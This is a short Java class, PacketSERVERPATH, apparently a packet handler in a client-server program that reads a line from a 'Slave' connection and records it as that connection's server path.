package com.redpois0n.packets;

import com.redpois0n.Slave;

public class PacketSERVERPATH extends AbstractPacket {

	@Override
	public void read(Slave slave, String line) throws Exception {
		line = slave.readLine();
		slave.setServerPath(line);

	}

}
